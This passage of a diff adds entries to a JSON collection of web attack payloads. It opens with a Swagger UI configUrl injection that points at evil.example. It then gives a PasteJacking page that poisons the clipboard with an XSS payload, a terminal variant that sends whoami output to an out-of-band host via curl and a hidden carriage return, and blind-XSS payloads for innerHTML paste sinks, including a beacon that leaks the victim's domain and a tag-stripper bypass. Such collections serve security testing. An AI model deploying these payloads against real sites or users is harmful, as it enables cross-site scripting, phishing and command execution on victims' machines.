{\"url\":\"https://.../test.yaml\"}):\nhttps://target/swagger-ui/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9ldmlsLmV4YW1wbGUvZXZpbC55YW1sIgp9\n\n# Detect: append ?url=https://<collab>/evil.yaml and catch the OOB fetch for evil.yaml; a fired alert = engine in the 3.14.1-3.37.x window; param ignored = >= 4.1.3 (queryConfigEnabled off)."
+    },
+    {
+      "subcategory": "PasteJacking / clipboard",
+      "title": "PasteJacking - clipboard-poisoning page (copy override)",
+      "language": "html",
+      "tags": [
+        "pastejacking",
+        "clipboard",
+        "xss",
+        "phishing"
+      ],
+      "body": "<!-- PasteJacking: the attacker page poisons the clipboard on the copy event. -->\n<!-- text/plain stays benign (terminal), text/html is poisoned (rich editor). preventDefault is REQUIRED. -->\n<!DOCTYPE html>\n<html>\n<body>\n  <p id=\"lure\">Copy this snippet and paste it into the editor to reproduce.</p>\n  <script>\n    document.addEventListener('copy', function (e) {\n      e.clipboardData.setData('text/plain', 'echo hello');\n      e.clipboardData.setData('text/html', '<img src=x onerror=\"alert(document.domain)\">');\n      e.preventDefault();\n    });\n  </script>\n</body>\n</html>\n\n<!-- Terminal variant (auto-run): put a command with a trailing newline \\n into text/plain -->\n<!--   copyTextToClipboard('curl https://<OOB>.oast.pro/$(whoami) #\\n') -->\n<!-- A leading \\r hides the real command by redrawing the terminal line. -->\n<!-- Modern async API (needs HTTPS + a click): -->\n<!--   navigator.clipboard.write([new ClipboardItem({'text/html':htmlBlob,'text/plain':textBlob})]) -->"
+    },
+    {
+      "subcategory": "PasteJacking / clipboard",
+      "title": "PasteJacking - blind XSS on paste into an innerHTML sink",
+      "language": "html",
+      "tags": [
+        "pastejacking",
+        "blind-xss",
+        "clipboard",
+        "innerhtml"
+      ],
+      "body": "<!-- Blind XSS on paste: the target does el.innerHTML = e.clipboardData.getData('text/html') on onpaste -->\n<!-- (or dangerouslySetInnerHTML) -> the pasted HTML runs in ANOTHER user's session (support / wiki reviewer). -->\n<!-- innerHTML does NOT run <script>, but it does fire inline handlers - hence img/svg-shaped payloads: -->\n<img src=x onerror=\"alert(document.domain)\">\n<svg onload=\"alert(document.domain)\">\n\n<!-- Blind OOB callback (another user renders it, you never see the page): -->\n<img src=x onerror=\"new Image().src='https://TOKEN.oast.pro/'+encodeURIComponent(document.domain)\">\n\n<!-- Naive tag-stripper bypass via a newline (regex /<(.*?)>/g without the m flag; Spaceraccoon case): -->\n<iframe srcdoc='&#x3c;script&#x3e;alert(document.domain)&#x3c;/script&#x3e;'\n></iframe\n>\n\n<!-- Vulnerable: rich-text / WYSIWYG comment boxes (helpdesk / tickets / wiki / CMS), react-contenteditable -> dangerouslySetInnerHTML. -->\n<!-- A bare contenteditable is sanitized by Chromium on paste -> you need an EXPLICIT innerHTML sink in the app. -->\n<!-- If the target runs DOMPurify on paste, onerror/onload are stripped and the vector is dead. -->"
     }
   ]
 }
